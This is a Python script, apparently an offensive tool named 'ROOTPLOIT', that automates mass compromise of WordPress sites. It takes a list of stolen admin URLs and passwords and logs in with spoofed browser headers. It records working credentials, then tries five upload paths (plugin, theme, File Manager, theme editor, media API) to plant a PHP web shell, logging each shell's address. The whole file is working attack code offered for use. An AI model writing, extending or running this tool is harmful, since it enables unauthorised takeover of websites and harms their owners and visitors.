import requests
import re
import sys
import os
import random
import urllib3
from multiprocessing.dummy import Pool
from rich.console import Console
from rich.panel import Panel
from rich.text import Text

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
requests.packages.urllib3.disable_warnings()

# Initialize rich console
console = Console()

# Define custom colors using hex codes
BANNER_COLOR = "#b3e32c"        # Light green for banner
GREEN_COLOR = "#2ecc71"         # Soft green for success messages (unused, kept for reference)
ACTIVE_TIME_COLOR = "#f1c40f"   # Bright yellow for active/time
BAD_OUTPUT_COLOR = "#ff7979"    # Soft red for bad output
GOOD_OUTPUT_COLOR = "#6ab04c"   # Vibrant green for good output
INPUT_VALUE_COLOR = "#3498db"   # Blue for input values
PROGRESS_COLORS = ["#3498db", "#9b59b6", "#e67e22"]  # Blue, purple, orange for progress (unused)

colors = {
    "red":     ["#990000", "#CC0000", "#FF0000", "#FF6666", "#CC6666", "#FF9999"],
    "green":   ["#006600", "#00AA00", "#00CC00", "#66FF66", "#66CC66", "#99FF99"],
    "yellow":  ["#999900", "#CCCC00", "#FFCC00", "#FFFF66", "#CCCC66", "#FFFF99"],
    "blue":    ["#003366", "#0055AA", "#0066CC", "#6699FF", "#6699CC", "#99CCFF"],
    "magenta": ["#660066", "#993399", "#CC33CC", "#FF66FF", "#FF66CC", "#FF99FF"],
    "cyan":    ["#006666", "#009999", "#33CCCC", "#66FFFF", "#66CCCC", "#99FFFF"]
}

def rainbow_text_block(text: str) -> Text:
    lines = text.split("\n")
    base_color = random.choice(list(colors.keys()))
    shades = colors[base_color]
    cycle = shades + shades[::-1]
    pattern = cycle * (len(lines) // len(cycle)) + cycle[:len(lines) % len(cycle)]
    styled_text = Text()
    for i, line in enumerate(lines):
        shade = pattern[i]
        styled_text.append(line, style=shade)
        styled_text.append("\n")
    return styled_text

def print_banner():
    logo = """

██████╗░░█████╗░░█████╗░████████╗██████╗░██╗░░░░░░█████╗░██╗████████╗
██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗██║░░░░░██╔══██╗██║╚══██╔══╝
██████╔╝██║░░██║██║░░██║░░░██║░░░██████╔╝██║░░░░░██║░░██║██║░░░██║░░░
██╔══██╗██║░░██║██║░░██║░░░██║░░░██╔═══╝░██║░░░░░██║░░██║██║░░░██║░░░
██║░░██║╚█████╔╝╚█████╔╝░░░██║░░░██║░░░░░███████╗╚█████╔╝██║░░░██║░░░
╚═╝░░╚═╝░╚════╝░░╚════╝░░░░╚═╝░░░╚═╝░░░░░╚══════╝░╚════╝░╚═╝░░░╚═╝░░░"""
    console.print(Panel(rainbow_text_block(logo), style=BANNER_COLOR, expand=False))

def get_random_headers():
    """Get ultra-most randomized headers"""
    chrome_versions = ['112.0.0.0', '113.0.0.0', '114.0.0.0', '115.0.0.0']
    firefox_versions = ['120.0', '120.0', '119.0', '118.0']
    safari_versions = ['17.2', '17.1', '17.0', '16.6']

    os_strings = [
        'Windows NT 10.0; Win64; x64',
        'Windows NT 11.0; Win64; x64',
        'Macintosh; Intel Mac OS X 10_15_7',
        'Macintosh; Intel Mac OS X 11_1_2',
        'X11; Linux x86_64',
        'X11; Ubuntu; Linux x86_64'
    ]
    browser_choice = random.randint(1, 10)

    if browser_choice <= 5:
        version = random.choice(chrome_versions)
        os_string = random.choice(os_strings)
        user_agent = 'Mozilla/5.0 (' + os_string + ') AppleWebKit/537.36 (KHTML, like Gecko) Chrome/' + version + ' Safari/537.36'
    elif browser_choice <= 8:
        version = random.choice(firefox_versions)
        os_string = random.choice(os_strings[:4])
        user_agent = 'Mozilla/5.0 (' + os_string + '; rv:' + version + ') Gecko/20100101 Firefox/' + version
    else:
        version = random.choice(safari_versions)
        os_string = random.choice(os_strings[2:4])
        user_agent = 'Mozilla/5.0 (' + os_string + ') AppleWebKit/605.1.15 (KHTML, like Gecko) Version/' + version + ' Safari/605.1.15'

    languages = [
        'en-US,en;q=0.9',
        'en-US,en;q=0.9,ar;q=0.8',
        'en-GB,en;q=0.9',
        'en-US,en;q=0.8,es;q=0.6',
        'en-US,en;q=0.9,fr;q=0.8',
        'en-US,en;q=0.9,de;q=0.8'
    ]

    referers = [
        'https://www.google.com/',
        'https://www.google.com/search?q=wordpress',
        'https://www.bing.com/',
        'https://duckduckgo.com/',
        'https://wordpress.org/',
        'https://www.facebook.com/',
        'https://t.co/'
    ]

    headers = {
        'User-Agent': user_agent,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': random.choice(languages),
        'Accept-Encoding': 'gzip, deflate, br',
        'DNT': random.choice(['1', None]),
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': random.choice(['none', 'same-origin', 'cross-site']),
        'Sec-Fetch-User': '?1',
        'Cache-Control': random.choice(['max-age=0', 'no-cache', None]),
        'Pragma': random.choice(['no-cache', None]),
    }

    if random.randint(1, 10) <= 7:
        headers['Referer'] = random.choice(referers)

    if 'Chrome' in user_agent:
        headers['Sec-Ch-Ua'] = '"Not_A Brand";v="99", "Chromium";v="' + version.split('.')[0] + '", "Google Chrome";v="' + version.split('.')[0] + '"'
        headers['Sec-Ch-Ua-Mobile'] = '?0'

    return headers

def URL_FOX(site):
    site = str(site)
    if site.startswith('http://'): site = site.replace('http://', ''); p = 'http://'
    elif site.startswith('https://'): site = site.replace('https://', ''); p = 'https://'
    else: p = 'http://'
    if '/' in site: site = site.rstrip().split('/')[0]
    return f'{p}{site}'

def input_Fox(txt):
    try:
        if sys.version_info[0] < 3:
            console.print(txt, style=INPUT_VALUE_COLOR, end='')
            return input().strip()
        else:
            console.print(txt, style=INPUT_VALUE_COLOR, end='')
            return input().strip()
    except:
        return ''

def URL_P(panel):
    try:
        admins = ['/wp-login.php', '/admin', '/user']
        for admin in admins:
            if str(admin) in str(panel):
                return re.findall(re.compile(f'(.*){admin}'), panel)[0]
        return str(panel).decode('utf8')
    except:
        return str(panel)

def content_Fox(req):
    if sys.version_info[0] < 3:
        try:
            try: return str(req.content)
            except:
                try: return str(req.content.encode('utf-8'))
                except: return str(req.content.decode('utf-8'))
        except: return str(req.text)
    else:
        try:
            try: return str(req.content.decode('utf-8'))
            except:
                try: return str(req.content.encode('utf-8'))
                except: return str(req.text)
        except: return str(req.content)

def verify_real_admin_access(session, url):
    """Strictly verify REAL admin panel access"""
    try:
        critical_pages = [
            '/wp-admin/index.php',
            '/wp-admin/profile.php',
            '/wp-admin/edit.php',
            '/wp-admin/plugins.php'
        ]

        verified_pages = 0
        admin_content = ""

        for page in critical_pages:
            try:
                test_url = url + page
                resp = session.get(test_url, headers=get_random_headers(),
                                   timeout=10, verify=False, allow_redirects=True)

                if resp.status_code == 200:
                    if 'wp-login.php' in resp.url:
                        return False, None

                    content = content_Fox(resp)

                    admin_indicators = [
                        '<div id="wpwrap">',
                        '<div id="wpcontent">',
                        '<div id="wpbody">',
                        'id="adminmenu"',
                        'id="adminmenuwrap"',
                        'class="wp-admin"',
                        'id="wpadminbar"',
                        'Dashboard'
                    ]

                    found = sum(1 for ind in admin_indicators if ind in content)
                    if found >= 4:
                        verified_pages += 1
                        if not admin_content:
                            admin_content = content

                    if verified_pages >= 2:
                        return True, admin_content
            except:
                continue

        return verified_pages >= 1, admin_content

    except:
        return False, None

def WP_Login_UPer(url, username, password):
    try:
        while url[-1] == '/': url = url[:-1]
        reqFox = requests.session()
        headersLogin = get_random_headers()
        headersLogin['referer'] = f'{url}/wp-admin/'
        loginPost_Fox = {'log': username, 'pwd': password, 'wp-submit': 'Log In', 'redirect_to': f'{url}/wp-admin/'}
        try: login_Fox = reqFox.post(f'{url}/wp-login.php', data=loginPost_Fox, headers=headersLogin, verify=False, timeout=30)
        except: login_Fox = reqFox.post(f'{url}/wp-login.php', data=loginPost_Fox, headers=headersLogin, verify=False, timeout=15)
        if URL_FOX(login_Fox.url) != URL_FOX(url):
            url = URL_P(login_Fox.url)
            reqFox = requests.session()
            loginPost_Fox = {'log': username, 'pwd': password, 'wp-submit': 'Log In', 'redirect_to': f'{url}/wp-admin/'}
            try: login_Fox = reqFox.post(f'{url}/wp-login.php', data=loginPost_Fox, headers=headersLogin, verify=False, timeout=30)
            except: login_Fox = reqFox.post(f'{url}/wp-login.php', data=loginPost_Fox, headers=headersLogin, verify=False, timeout=15)
        login_Fox = content_Fox(login_Fox)
        if 'profile/login' in login_Fox:
            id_wp = re.findall(re.compile('type="hidden" name="force_redirect_uri-(.*)" id='), login_Fox)[0]
            myuserpro = re.findall(re.compile('name="_myuserpro_nonce" value="(.*)" /><input type="hidden" name="_wp_http_referer"'), login_Fox)[0]
            loginPost_Fox = {
                'template': 'login', 'unique_id': f'{id_wp}', 'up_username': '0', 'user_action': '',
                '_myuserpro_nonce': myuserpro, '_wp_http_referer': '/profile/login/',
                'action': 'userpro_process_form',
                f'force_redirect_uri-{id_wp}': '0', 'group': 'default',
                f'redirect_uri-{id_wp}': '', 'shortcode': '',
                f'user_pass-{id_wp}': password, f'username_or_email-{id_wp}': username
            }
            try: login_Fox = reqFox.post(f'{url}/wp-admin/admin-ajax.php', data=loginPost_Fox, headers=headersLogin, verify=False, timeout=30)
            except: login_Fox = reqFox.post(f'{url}/wp-admin/admin-ajax.php', data=loginPost_Fox, headers=headersLogin, verify=False, timeout=15)
        try: check = content_Fox(reqFox.get(f'{url}/wp-admin/', headers=get_random_headers(), verify=False, timeout=30))
        except: check = content_Fox(reqFox.get(f'{url}/wp-admin/', headers=get_random_headers(), verify=False, timeout=15))
        if 'wp-admin/profile.php' in check or 'wp-admin/upgrade.php' in check:
            with open('Successfully_logged_WordPress.txt', 'a', encoding='utf-8') as f:
                f.write(f'{url}/wp-login.php#{username}@{password}\n')
            console.print(f"[+] {url} -> Succeeded Login.", style=GOOD_OUTPUT_COLOR)
            if 'plugin-install.php' in check:
                with open('plugin-install.txt', 'a', encoding='utf-8') as f:
                    f.write(f'{url}/wp-login.php#{username}@{password}\n')
                console.print(f"[+] {url} -> Succeeded plugin-install.", style=GOOD_OUTPUT_COLOR)
            if 'WP File Manager' in check:
                with open('filemanager.txt', 'a', encoding='utf-8') as f:
                    f.write(f'{url}/wp-login.php#{username}@{password}\n')
                console.print(f"[+] {url} -> Succeeded Wp File Manager.", style=GOOD_OUTPUT_COLOR)
            verified, admin_content = verify_real_admin_access(reqFox, url)
            if verified:
                with open('full-admin-confirmed.txt', 'a', encoding='utf-8') as f:
                    f.write(f'{url}/wp-login.php#{username}@{password}\n')
                console.print(f"[+] {url} -> Succeeded Admin Access.", style=GOOD_OUTPUT_COLOR)
                console.print(f"[*] {url} -> Attempting uploads...", style=ACTIVE_TIME_COLOR)
                shell_url = try_all_upload_methods(url, reqFox)
                if shell_url:
                    with open('Up.txt', 'a', encoding='utf-8') as f:
                        f.write(shell_url + '\n')
                    console.print(f"[+] {url} -> Upload Succeeded: {shell_url}", style=GOOD_OUTPUT_COLOR)
                else:
                    console.print(f"[-] {url} -> All Upload Method Failed", style=BAD_OUTPUT_COLOR)
            else:
                console.print(f"[-] {url} -> Invalid Admin Access.", style=BAD_OUTPUT_COLOR)
        else:
            console.print(f"[-] {url} -> Login Failed.", style=BAD_OUTPUT_COLOR)
            return False
    except:
        console.print(f"[-] {url} -> Time out.", style=BAD_OUTPUT_COLOR)
        return False

def data_PL_Filter(panel):
    try:
        user = panel.split('#')[1].split('@')[0]
        pswd = re.findall(re.compile(f'#{user}(.*)'), panel)[0][1:]
        return user, pswd
    except:
        return False

def upload_random_plugin(url, session):
    try:
        foldername = os.urandom(4).hex()
        plugin_page = session.get(url + '/wp-admin/plugin-install.php?tab=upload',
                                 headers=get_random_headers(), timeout=15, verify=False)
        plugin_content = content_Fox(plugin_page)
        nonce_match = re.findall(r'id="_wpnonce" name="_wpnonce" value="(.*?)"', plugin_content)
        if not nonce_match:
            return None
        nonce = nonce_match[0]
        if not os.path.exists('Files/plugin.zip'):
            return None
        filedata = {
            '_wpnonce': nonce,
            '_wp_http_referer': '/wp-admin/plugin-install.php?tab=upload',
            'install-plugin-submit': 'Install Now'
        }
        files = {
            'pluginzip': (foldername + '.zip', open('Files/plugin.zip', 'rb'), 'multipart/form-data')
        }
        upload_resp = session.post(url + '/wp-admin/update.php?action=upload-plugin',
                                   data=filedata, files=files, headers=get_random_headers(),
                                   timeout=60, verify=False)
        shell_url = url + '/wp-content/plugins/' + foldername + '/index.php'
        check_resp = requests.get(shell_url, headers=get_random_headers(), timeout=10, verify=False)
        if check_resp.status_code == 200 and 'ROOTPLOIT' in check_resp.text:
            return shell_url
        return None
    except:
        return None

def upload_wp_file_manager(url, session):
    try:
        filename = os.urandom(4).hex() + '.php'
        if not os.path.exists('Files/index.php'):
            return None
        with open('Files/index.php', 'r') as f:
            shell_content = f.read()
        fm_page = session.get(url + '/wp-admin/plugin-install.php?s=File+Manager&tab=search&type=term',
                             headers=get_random_headers(), timeout=15, verify=False)
        fm_content = content_Fox(fm_page)
        if 'admin.php?page=wp_file_manager' in fm_content:
            admin_page = session.get(url + '/wp-admin/admin.php?page=wp_file_manager#elf_ll_Lw',
                                    headers=get_random_headers(), timeout=15, verify=False)
            admin_content = content_Fox(admin_page)
            nonce_match = re.findall(r'admin-ajax.php","nonce":"(.*?)","lang"', admin_content)
            if nonce_match:
                nonce = nonce_match[0]
                files = {'upload[]': (filename, shell_content, 'multipart/form-data')}
                data = {
                    '_wpnonce': nonce,
                    'action': 'mk_file_folder_manager',
                    'cmd': 'upload',
                    'target': 'll_Lw'
                }
                upload_resp = session.post(url + '/wp-admin/admin-ajax.php',
                                          data=data, files=files, headers=get_random_headers(),
                                          timeout=60, verify=False)
                shell_url = url + '/' + filename
                check_resp = requests.get(shell_url, headers=get_random_headers(), timeout=10, verify=False)
                if check_resp.status_code == 200 and 'ROOTPLOIT' in check_resp.text:
                    return shell_url
        return None
    except:
        return None

def upload_random_theme(url, session):
    try:
        foldername = os.urandom(4).hex()
        theme_page = session.get(url + '/wp-admin/theme-install.php?tab=upload',
                                 headers=get_random_headers(), timeout=15, verify=False)
        theme_content = content_Fox(theme_page)
        nonce_match = re.findall(r'id="_wpnonce" name="_wpnonce" value="(.*?)"', theme_content)
        if not nonce_match:
            return None
        nonce = nonce_match[0]
        if not os.path.exists('Files/theme.zip'):
            return None
        filedata = {
            '_wpnonce': nonce,
            '_wp_http_referer': '/wp-admin/theme-install.php?tab=upload',
            'install-theme-submit': 'Install Now'
        }
        files = {
            'themezip': (foldername + '.zip', open('Files/theme.zip', 'rb'), 'multipart/form-data')
        }
        upload_resp = session.post(url + '/wp-admin/update.php?action=upload-theme',
                                   data=filedata, files=files, headers=get_random_headers(),
                                   timeout=60, verify=False)
        shell_url = url + '/wp-content/themes/' + foldername + '/about.php'
        check_resp = requests.get(shell_url, headers=get_random_headers(), timeout=10, verify=False)
        if check_resp.status_code == 200 and 'ROOTPLOIT' in check_resp.text:
            return shell_url
        return None
    except:
        return None

def upload_via_theme_editor(url, session):
    try:
        editor_page = session.get(url + '/wp-admin/theme-editor.php?file=404.php',
                                  headers=get_random_headers(), timeout=30, verify=False)
        editor_content = content_Fox(editor_page)
        if 'theme-editor.php' not in editor_content or 'Update File' not in editor_content:
            return None
        nonce_match = re.findall(r'name="wpnonce" value="([^"]+)"', editor_content)
        if not nonce_match:
            return None
        nonce = nonce_match[0]
        theme_match = re.findall(r'name="theme" value="([^"]+)"', editor_content)
        if not theme_match:
            theme_match = re.findall(r'theme=([^&]+)', editor_content)
            if not theme_match:
                return None
        theme_name = theme_match[0]
        if not os.path.exists('Files/index.php'):
            return None
        with open('Files/index.php', 'r') as f:
            shell_content = f.read()
        post_data = {
            'wpnonce': nonce,
            '_wp_http_referer': f'/wp-admin/theme-editor.php?file=404.php&theme={theme_name}',
            'newcontent': shell_content,
            'action': 'edit-theme-plugin-file',
            'file': '404.php',
            'theme': theme_name,
            'docs-list': ''
        }
        update_resp = session.post(url + '/wp-admin/admin-ajax.php',
                                   data=post_data, headers=get_random_headers(),
                                   timeout=30, verify=False)
        shell_urls = [
            url + '/404.php',
            url + '/wp-content/themes/' + theme_name + '/404.php'
        ]
        for shell_url in shell_urls:
            check_resp = requests.get(shell_url, headers=get_random_headers(), timeout=10, verify=False)
            if check_resp.status_code == 200 and 'ROOTPLOIT' in check_resp.text:
                return shell_url
        return None
    except:
        return None

def upload_via_media(url, session):
    try:
        admin_page = session.get(url + '/wp-admin/', headers=get_random_headers(), timeout=15, verify=False)
        admin_content = content_Fox(admin_page)
        nonce_match = re.findall(r'wpApiSettings = .*?"nonce":"(.*?)"', admin_content)
        if not nonce_match:
            return None
        nonce = nonce_match[0]
        file_path = 'Files/index.php'
        if not os.path.exists(file_path):
            return None
        with open(file_path, 'rb') as f:
            shell_content = f.read()
        headers_rest = get_random_headers()
        headers_rest['X-WP-Nonce'] = nonce
        files = {'file': ('index.php', shell_content, 'php')}
        data = {'title': 'ROOTPLOIT', 'caption': 'ROOTPLOIT'}
        upload_resp = session.post(url + '/wp-json/wp/v2/media', data=data, files=files, headers=headers_rest, verify=False, timeout=60)
        if upload_resp.status_code == 201:
            resp_json = upload_resp.json()
            shell_url = resp_json.get('source_url') or resp_json['guid']['rendered']
            check_resp = requests.get(shell_url, headers=get_random_headers(), timeout=10, verify=False)
            if check_resp.status_code == 200 and 'ROOTPLOIT' in check_resp.text:
                return shell_url
        return None
    except:
        return None

def try_all_upload_methods(url, session):
    upload_methods = [
        ('Plugin Upload', upload_random_plugin, colors["magenta"][2]),
        ('File Manager', upload_wp_file_manager, colors["blue"][2]),
        ('Theme Upload', upload_random_theme, colors["cyan"][2]),
        ('Theme Editor', upload_via_theme_editor, colors["blue"][3]),
        ('Media Upload', upload_via_media, colors["yellow"][2])
    ]
    for method_name, method_func, color in upload_methods:
        console.print(f"[+] Trying {method_name}...", style=color, end='')
        shell_url = method_func(url, session)
        if shell_url:
            console.print(f"[SUCCESS!]", style=GOOD_OUTPUT_COLOR)
            return shell_url
        else:
            console.print(f"[Failed]", style=BAD_OUTPUT_COLOR)
    return None

def login(panel):
    try:
        if '/wp-login.php' not in panel:
            return False
        data = data_PL_Filter(panel)
        if data is False:
            return False
        WP_Login_UPer(URL_P(panel), data[0], data[1])
    except:
        return False

def mylist():
    try:
        try:
            target = open(sys.argv[1], 'r', encoding='utf-8')
            return target
        except:
            yList = str(input_Fox('   Your List --> : '))
            if not os.path.isfile(yList) and '.txt' not in yList:
                yList = f'{yList}.txt'
            while not os.path.isfile(yList):
                console.print(f"\n   {yList} File does not exist, You have to put your list in the same folder.\n", style=BAD_OUTPUT_COLOR)
                yList = str(input_Fox('   Your List --> : '))
            target = open(yList, 'r', encoding='utf-8')
            return target
    except Exception as e:
        console.print(f"Error: {e}", style=BAD_OUTPUT_COLOR)
        return False

# Print banner
print_banner()

# Run the script
mp = Pool(30)
mp.map(login, [line.strip() for line in mylist() if line.strip()])